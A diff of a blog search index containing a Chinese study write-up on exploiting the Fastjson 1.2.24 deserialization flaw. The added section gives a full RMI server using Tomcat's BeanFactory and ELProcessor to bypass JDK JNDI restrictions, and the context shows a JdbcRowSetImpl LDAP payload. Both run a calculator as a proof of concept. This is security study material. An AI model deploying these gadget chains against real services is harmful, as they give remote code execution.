@@ -3749,11 +3749,14 @@
 <p>这里我用工具起一个ldap服务器，再改一下客户端代码就好了</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1/HuoyZUQEBX/CommonsCollections6/Exec/eyJjbWQiOiJvcGVuIC1hIGNhbGN1bGF0b3IifQ==\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="LDAP高版本绕过"><a href="#LDAP高版本绕过" class="headerlink" title="LDAP高版本绕过"></a>LDAP高版本绕过</h4><p>如果要高版本绕过，依旧是选择本地恶意类加载就好，用到beanfactory即可，这里就不演示了</p>
+<h4 id="JDK高版本绕过"><a href="#JDK高版本绕过" class="headerlink" title="JDK高版本绕过"></a>JDK高版本绕过</h4><p>如果要高版本绕过，依旧是选择本地恶意类加载就好，用到beanfactory即可</p>
+<p>服务端代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接使用Reference类而不是ResourceRef</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)&quot;</span>));</span><br><span class="line">        <span class="comment">// 包装并绑定</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;calc&quot;</span>, wrapper);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;RMI服务已启动，等待客户端连接...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h3 id="基于BasicDataSouce的利用链"><a href="#基于BasicDataSouce的利用链" class="headerlink" title="基于BasicDataSouce的利用链"></a>基于BasicDataSouce的利用链</h3><p>这个和tomcat相关，好处是可以不出网，用到本地的恶意类加载</p>
 <p>tomcat有一个<code>org.apache.bcel.util.ClassLoader</code>类，里面有defineClass实现类加载</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420154253.png" ></p>
-<p>要瞒住这段代码然后创建一个类名再到后面defineClass</p>
+<p>要满足这段代码然后创建一个类名再到后面defineClass</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">	clazz = <span class="built_in">this</span>.createClass(class_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>所以现在先想办法调用<code>loadClass()</code>，现在尝试直接调用</p>
@@ -3779,7 +3782,7 @@
 <p>这个链子大概就是这样。</p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>【fastjson反序列化漏洞2-1.2.24利用】<a class="link"   href="https://www.bilibili.com/video/BV1pP411N726?vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1pP411N726?vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" >https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>前面讲到的利用还是套上了以前的知识，这次是用json字符串去触发反序列化，所以要先理解好前面的内容，相对来说结合jndi注入的利益链比较常见</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>前面讲到的利用还是套上了以前的知识，这次是用json字符串去触发反序列化，所以要先理解好前面的内容，相对来说结合jndi注入的利用链比较常见</p>
 ]]></content>
       <tags>
         <tag>java</tag>
@@ -3949,5 +3952,10 @@
         <tag>java</tag>
         <tag>学习</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Spring开发扫盲</title>
+    <url>/2025/04/24/Spring%E5%BC%80%E5%8F%91%E6%89%AB%E7%9B%B2/</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
